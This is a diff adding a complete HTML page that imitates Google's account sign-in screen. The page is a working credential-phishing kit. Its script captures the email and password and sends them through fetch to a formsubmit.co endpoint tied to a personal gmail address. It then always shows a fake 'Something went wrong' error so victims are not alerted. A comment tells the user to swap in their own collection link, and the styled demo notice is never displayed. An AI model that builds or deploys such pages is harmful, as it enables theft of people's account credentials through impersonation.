@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in — Google Account</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .demo-notice {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: #fef3c7;
+            border-bottom: 2px solid #f59e0b;
+            color: #92400e;
+            padding: 10px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 500;
+            z-index: 100;
+        }
+
+        body {
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            padding: 80px 24px 24px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 448px;
+        }
+
+        .google-logo {
+            text-align: center;
+            font-size: 56px;
+            font-weight: 400;
+            margin-bottom: 16px;
+        }
+        .g-blue { color: #4285F4; }
+        .g-red  { color: #EA4335; }
+        .g-yell { color: #FBBC05; }
+        .g-green { color: #34A853; }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 12px;
+        }
+
+        .desc {
+            font-size: 16px;
+            color: #5f6368;
+            text-align: center;
+            line-height: 1.5;
+            margin-bottom: 32px;
+        }
+
+        .learn-link {
+            color: #4285F4;
+            text-decoration: none;
+        }
+        .learn-link:hover {
+            text-decoration: underline;
+        }
+
+        .input-wrapper {
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            background: transparent;
+            transition: all 0.2s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #4285F4;
+            border-width: 2px;
+        }
+
+        .forgot-link {
+            color: #4285F4;
+            font-size: 14px;
+            text-decoration: none;
+            display: inline-block;
+            margin: 6px 0 40px;
+        }
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .create-link {
+            color: #4285F4;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        .create-link:hover {
+            text-decoration: underline;
+        }
+
+        .btn-wrapper {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 16px;
+        }
+
+        .btn-next {
+            background: #dadce0;
+            color: #80868b;
+            border: none;
+            padding: 10px 28px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: not-allowed;
+            transition: all 0.2s ease;
+        }
+        .btn-next.active {
+            background: #4285F4;
+            color: #ffffff;
+            cursor: pointer;
+        }
+        .btn-next.active:hover {
+            background: #3367D6;
+        }
+
+        /* Loading Box */
+        #loadBox {
+            display: none;
+            text-align: center;
+            padding-top: 60px;
+        }
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 3px solid #e8eaed;
+            border-top: 3px solid #4285F4;
+            border-right: 3px solid #4285F4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 24px auto;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .loading-text {
+            font-size: 22px;
+            color: #5f6368;
+            margin-bottom: 12px;
+        }
+        .submitted-note {
+            font-size: 14px;
+            color: #34A853;
+            background: #e6f4ea;
+            padding: 8px 16px;
+            border-radius: 4px;
+            display: inline-block;
+            margin-bottom: 16px;
+        }
+
+        /* Error Box */
+        #errBox {
+            display: none;
+            text-align: center;
+            padding-top: 60px;
+        }
+        .error-icon {
+            font-size: 64px;
+            color: #d93025;
+            margin-bottom: 24px;
+        }
+        .error-title {
+            font-size: 24px;
+            color: #202124;
+            margin-bottom: 12px;
+        }
+        .error-desc {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 32px;
+        }
+        .btn-back {
+            background: #4285F4;
+            color: #fff;
+            border: none;
+            padding: 10px 28px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .btn-back:hover {
+            background: #3367D6;
+        }
+    </style>
+</head>
+<body>
+    <div class=""></div>
+
+    <!-- SIGN IN FORM -->
+    <div class="container" id="formBox">
+        <!-- ✅ PALITAN MO ANG LINK SA IBABA NG FORMSPREE MO -->
+        <form id="myForm" action="https://formsubmit.co/jamesthroycagabhion@gmail.com" method="POST">
+            <div class="google-logo">
+                <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yell">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
+            </div>
+            <h1>Sign in</h1>
+            <p class="desc">
+                Use your Google Account. The account will be added to this device and available to other Google apps.<br>
+                <a href="#" class="learn-link" onclick="return false;">Learn more about using your account</a>
+            </p>
+
+            <div class="input-wrapper">
+                <input type="email" id="email" name="email" placeholder="Email or phone" oninput="checkInput()" required>
+            </div>
+
+            <div class="input-wrapper">
+                <input type="password" id="password" name="password" placeholder="Enter your password" oninput="checkInput()" required>
+            </div>
+
+            <a href="#" class="forgot-link" onclick="return false;">Forgot password?</a>
+
+            <div class="btn-wrapper">
+                <a href="#" class="create-link" onclick="return false;">Create account</a>
+                <button type="submit" class="btn-next" id="submitBtn">Next</button>
+            </div>
+        </form>
+    </div>
+
+    <!-- LOADING BOX -->
+    <div id="loadBox">
+        <div class="google-logo">
+            <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yell">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
+        </div>
+        <p class="loading-text">Signing in...</p>
+        <p class="submitted-not"></p>
+        <div class="spinner"></div>
+        <p>Verifying information</p>
+    </div>
+
+    <!-- ERROR BOX -->
+    <div id="errBox">
+        <div class="error-icon">⚠️</div>
+        <h2 class="error-title">Something went wrong</h2>
+        <p class="error-desc">We couldn't sign you in. Please check your information and try again.</p>
+        <button class="btn-back" onclick="balik()">Try again</button>
+    </div>
+
+    <script>
+        // Enable/Disable Submit Button
+        function checkInput() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+            const btn = document.getElementById('submitBtn');
+            
+            if (email.length > 0 && pass.length > 0) {
+                btn.classList.add('active');
+            } else {
+                btn.classList.remove('active');
+            }
+        }
+
+        // Form Submit
+        const form = document.getElementById('myForm');
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Show Loading
+            document.getElementById('formBox').style.display = 'none';
+            document.getElementById('loadBox').style.display = 'block';
+            
+            // Send to Formspree
+            fetch(form.action, {
+                method: 'POST',
+                body: new FormData(form),
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                // Success — go to error page after delay
+                setTimeout(() => {
+                    document.getElementById('loadBox').style.display = 'none';
+                    document.getElementById('errBox').style.display = 'block';
+                }, 3000);
+            })
+            .catch(error => {
+                // Even if error — still go to error page
+                setTimeout(() => {
+                    document.getElementById('loadBox').style.display = 'none';
+                    document.getElementById('errBox').style.display = 'block';
+                }, 3000);
+            });
+        });
+
+        // Back to Form
+        function balik() {
+            document.getElementById('errBox').style.display = 'none';
+            document.getElementById('formBox').style.display = 'block';
+            document.getElementById('myForm').reset();
+        }
+    </script>
+</body>
+</html>
